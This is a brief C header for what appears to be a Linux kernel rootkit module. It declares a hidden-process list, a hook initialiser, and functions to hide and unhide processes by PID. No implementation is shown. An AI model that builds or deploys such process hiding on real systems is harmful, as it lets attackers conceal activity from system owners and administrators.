#pragma once

#include <linux/list.h>

typedef struct {
    pid_t id;
    struct list_head list_node;
} ProcessId;

extern struct list_head hidden_processes;

void init_hook(void);

int hide_process(pid_t pid);

int unhide_process(pid_t pid);

